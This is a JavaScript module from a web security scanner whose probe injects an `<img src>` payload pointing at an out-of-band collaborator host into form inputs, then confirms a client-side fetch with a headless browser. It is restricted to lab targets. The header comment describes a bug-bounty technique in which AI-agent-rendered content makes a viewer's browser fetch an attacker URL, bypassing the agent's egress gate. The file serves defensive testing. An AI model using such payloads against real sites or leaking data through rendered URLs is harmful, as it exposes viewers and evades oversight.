// Dark Matter rule-based scanner — egress-laundering probe (H3(b)).
//
// Technique (V8-F1, Muse Cat 7, up to $5,000 — taught to the scanner
// 11 Nov 2026, owner order: hunt, then train): when agent-generated
// rendered content preserves an external URL verbatim, a viewer browser
// fetches that URL directly — disclosing the viewer IP and view event,
// and transmitting any data encoded in the URL — with no approval, no
// warning, no proxy rewrite, and no sanitisation. The fetch is made by
// the viewer browser, so it never passes through the agent egress gate.
// Meta's Cat 7 explicitly lists "rendered content causing the client
// to fetch an attacker URL."
//
// This probe is the target-side analogue: a stored-content sink (form
// input re-rendered into HTML) that preserves an external URL in a
// fetchable attribute is the same primitive, and the same client-side
// fetch follows when a viewer opens the page.
//
//   Step 1 (baseline): GET the form's action page — the freshly-random
//     canary token must be ABSENT (sanity control).
//   Step 2 (inject): submit `<img src="<canaryUrl>">` into a text
//     input (POST body or GET query, matching the form's method).
//   Step 3 (verbatim): re-GET the action page AND the site root. The
//     canary URL must appear VERBATIM inside an automatic-fetch
//     attribute (img/iframe/script src, link href, object data,
//     video poster, background). A URL rendered as plain text, or
//     HTML-escaped, is not a fetch — not a finding.
//   Step 4 (fetch confirmation): render the stored page in a real
//     browser (renderDom, chromium --dump-dom) and wait on the OOB
//     collaborator for the token. The scanner's own fetch() never loads
//     subresources, so a collaborator hit here can only come from the
//     viewer browser — that is the (c) distinction: a fetch by the
//     viewer client is OUTSIDE the agent egress gate and is a finding;
//     an agent-issued POST through the gate is permitted by design
//     (v5 C4) and is NOT a finding. No hit, no finding.
//
// LAB-GATED (safety requirement): the collaborator URL goes out ONLY
// when the target host is listed in opts.labTargets, and only when the
// collaborator is wired (opts.oobCallback + opts.oobWaitFor). A non-lab
// target never receives a callback URL; without a waiter there is
// nothing to confirm a hit with, so the probe returns [] without a
// single request. One confirmed finding per scan (first hit wins);
// each attempt is bounded (render only on a verbatim candidate).
//
// Oracle: evidence.verbatimPreserved=true AND evidence.clientFetchHit
// =true under the egress_laundering protocol (differential.js) ->
// 'confirmed'. Either flag missing leaves the finding unconfirmed or
// rejected — the probe itself only reports when both hold.
import { randomBytes } from 'node:crypto';
import { isLabTargetHost } from '../../labCreds.js';
import { renderDom } from '../domRender.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const MAX_FORMS = 3;
const MAX_INPUTS_PER_FORM = 2;
const RENDER_WAIT_MS = 8000;

// Automatic-fetch attributes: a URL in one of these is fetched by the
// viewer browser on render, with no click. <a href> is deliberately
// NOT here — a link fetches only on click, so it cannot prove an
// automatic client-side fetch. href counts only on <link> (stylesheet
// / preload), which the browser fetches on render.
const AUTO_FETCH_ATTRS = ['src', 'data', 'poster', 'background'];

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      signal: ctrl.signal,
      headers: { 'User-Agent': UA, ...(opts.headers || {}) },
    });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

async function post(url, params, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: ctrl.signal,
      headers: {
        'User-Agent': UA,
        'Content-Type': 'application/x-www-form-urlencoded',
        ...(opts.headers || {}),
      },
      body: params.toString(),
    });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

function isSubmittish(name) {
  return /^(submit|button|reset|image)$/i.test(String(name || ''));
}

function fillParams(inputs, targetName, payload) {
  const params = new URLSearchParams();
  let n = 0;
  for (const inp of inputs || []) {
    const name = inp.name;
    if (!name) continue;
    if (isSubmittish(name)) continue;
    if (name === targetName) params.set(name, payload);
    else params.set(name, `dmprobe${++n}_${randomBytes(2).toString('hex')}`);
  }
  // DVWA-style forms require Submit to be set (isset gate).
  params.set('Submit', '1');
  return params;
}

function siteRoot(url) {
  try {
    const u = new URL(url);
    return `${u.protocol}//${u.host}/`;
  } catch {
    return url;
  }
}

// Is the canary URL preserved verbatim as the value of an
// automatic-fetch attribute? Returns { attr, window } for the first
// such occurrence, else null. Pure — exported for unit tests.
//
// The check is positional, not a URL regex: for each occurrence of
// the canary string, the ~80 chars before it must end in a
// fetchable-attribute assignment (`src="`, `data='`, …) or a <link>
// href assignment, and the char right after the URL must be the
// closing quote. An HTML-escaped payload (`&lt;img src=&quot;…`)
// fails both: the "before" slice ends in `;`, not a quote, and the
// URL is not an attribute value. A URL rendered as plain text fails
// the same way. Only a real attribute value passes.
export function findVerbatimFetchable(html, canaryUrl) {
  const body = String(html || '');
  const needle = String(canaryUrl || '');
  if (!needle) return null;
  const attrAlt = AUTO_FETCH_ATTRS.join('|');
  const attrRe = new RegExp(`(?:${attrAlt})\\s*=\\s*["']$`, 'i');
  const linkRe = /<link\b[^>]*\bhref\s*=\s*["']$/i;
  let from = 0;
  for (;;) {
    const idx = body.indexOf(needle, from);
    if (idx === -1) return null;
    const after = body[idx + needle.length];
    if (after === '"' || after === "'") {
      const before = body.slice(Math.max(0, idx - 120), idx);
      const attrM = attrRe.exec(before);
      const linkM = linkRe.exec(before);
      const attr = attrM ? attrM[0].trim().replace(/\s*=.*$/, '').toLowerCase() : linkM ? 'href' : null;
      if (attr) {
        return {
          attr,
          window: body.slice(Math.max(0, idx - 60), idx + needle.length + 60),
        };
      }
    }
    from = idx + needle.length;
  }
}

export async function probeEgressLaundering(forms, url, opts = {}) {
  const findings = [];
  // LAB GATE: the collaborator URL goes out only for lab targets.
  if (!isLabTargetHost(url, opts.labTargets)) return findings;
  const oobCallback = String(opts.oobCallback || '').replace(/\/+$/, '');
  const oobWaitFor = opts.oobWaitFor;
  const oobHasHit = opts.oobHasHit;
  // Fail-closed: without a collaborator there is nothing to confirm
  // a client-side fetch with, so send nothing.
  if (!oobCallback || typeof oobWaitFor !== 'function') return findings;
  const render = typeof opts.renderDom === 'function' ? opts.renderDom : renderDom;
  const root = siteRoot(url);

  for (const form of (forms || []).slice(0, MAX_FORMS)) {
    const targets = (form.inputs || []).filter((i) => i.name && !isSubmittish(i.name)).slice(0, MAX_INPUTS_PER_FORM);
    for (const input of targets) {
      const inputName = input.name;
      const token = `h3b${randomBytes(6).toString('hex')}`;
      const canaryUrl = `${oobCallback}/${token}`;
      const payload = `<img src="${canaryUrl}">`;
      // Step 1 (baseline): the fresh token must be absent.
      let baseline = '';
      try {
        baseline = await get(form.action, opts);
      } catch {
        continue;
      }
      if (baseline.includes(token)) continue;
      // Step 2 (inject): submit the payload into the input.
      const params = fillParams(form.inputs, inputName, payload);
      try {
        if (String(form.method || 'get').toLowerCase() === 'post') {
          await post(form.action, params, opts);
        } else {
          await get(`${form.action}${form.action.includes('?') ? '&' : '?'}${params.toString()}`, opts);
        }
      } catch {
        continue;
      }
      // Step 3 (verbatim): the canary URL must survive in a
      // fetchable attribute on the action page or the site root.
      let storedAt = '';
      let storedWindow = '';
      let verbatim = null;
      for (const checkUrl of [form.action, root]) {
        let body = '';
        try {
          body = await get(checkUrl, opts);
        } catch {
          continue;
        }
        const hit = findVerbatimFetchable(body, canaryUrl);
        if (hit) {
          verbatim = hit;
          storedAt = checkUrl;
          storedWindow = hit.window;
          break;
        }
      }
      if (!verbatim) continue; // stripped / proxied / rewritten / escaped — not a finding
      // Step 4 (fetch confirmation): a real browser render of the
      // stored page must fetch the canary URL. Contamination guard: a
      // hit for a fresh token before the render means the token leaked
      // (or a non-browser path fetched it) — skip, do not report.
      if (typeof oobHasHit === 'function' && oobHasHit(token)) continue;
      let rendered = null;
      try {
        rendered = await render(storedAt, opts);
      } catch {
        continue;
      }
      if (!rendered || !rendered.ok) continue; // the browser never rendered — no fetch to confirm
      let hit = null;
      try {
        hit = await oobWaitFor(token, RENDER_WAIT_MS);
      } catch {
        hit = null;
      }
      if (!hit) continue; // preserved but never fetched — unconfirmed, not a finding
      findings.push({
        class: 'egress_laundering',
        id: `egress-laundering-${form.action}-${inputName}`.slice(0, 120),
        title: 'Egress laundering via stored content — viewer browser fetches an external URL (HIGH)',
        severity: 'high',
        url: form.action,
        param: inputName,
        parameter: inputName, // dedup key: one finding per sink input, not per page
        evidence: {
          request: `${String(form.method || 'get').toUpperCase()} ${form.action} (${inputName}=<img src="${canaryUrl}">)`,
          response: `canary URL preserved verbatim in a fetchable attribute (${verbatim.attr}) on ${storedAt} — "...${storedWindow}..." — and a real browser render fetched it (collaborator hit for token ${token}, ${hit.method || 'GET'} ${hit.path || ''} at ${hit.at || ''}${hit.userAgent ? `, UA: ${String(hit.userAgent).slice(0, 120)}` : ''}). Absent in pre-submit baseline.`,
          impact_demo:
            'Attacker-controlled stored content causes every viewer browser to fetch an attacker URL directly — disclosing the viewer IP + view event and transmitting any data encoded in the URL — with no approval, no warning, no proxy rewrite, and no sanitisation. The fetch is made by the viewer browser, so it never passes through the agent egress gate (an agent-issued POST through the gate is permitted by design and is NOT a finding).',
          verbatimPreserved: true,
          clientFetchHit: true,
        },
      });
      if (findings.length) break; // one confirmed finding per scan is enough
    }
    if (findings.length) break;
  }
  return findings;
}

export const __egressLaunderingMeta = { phases: ['egress-laundering'], depth: ['quick', 'standard', 'deep'] };
